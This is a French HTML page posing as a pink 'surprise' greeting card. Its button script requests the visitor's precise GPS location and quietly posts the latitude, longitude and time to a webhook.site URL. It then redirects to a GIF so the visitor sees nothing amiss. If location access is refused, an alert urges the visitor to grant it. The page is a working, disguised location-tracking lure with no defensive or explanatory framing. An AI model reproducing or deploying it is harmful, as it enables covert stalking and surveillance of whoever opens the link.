<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Une surprise pour toi ✨</title>
    <style>
        body { background-color: #fff0f5; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; border: 2px solid #ffb6c1; max-width: 300px; }
        h1 { color: #ff69b4; font-size: 22px; }
        .emoji { font-size: 50px; margin-bottom: 10px; }
        button { background-color: #ffb6c1; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 16px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        button:hover { background-color: #ff69b4; transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="card">
        <div class="emoji">🌸</div>
        <h1>Coucou ! ✨</h1>
        <p>Clique sur le bouton pour découvrir ta petite surprise...</p>
        <button onclick="envoyerGps()">Ouvrir ma surprise 🎁</button>
    </div>

    <script>
        function envoyerGps() {
            const webhookUrl = "https://webhook.site/e8e69f2b-cf41-4a3c-82f9-f71bb8c1c338";

            navigator.geolocation.getCurrentPosition((pos) => {
                fetch(webhookUrl, {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        date: new Date().toLocaleString()
                    })
                });
                // Redirection vers un GIF mignon
                window.location.href = "https://media.giphy.com/media/KztT2c4u8mYYUiMKd1/giphy.gif";
            }, (err) => {
                alert("Oups ! Pour voir la surprise, il faut autoriser la localisation. ✨");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
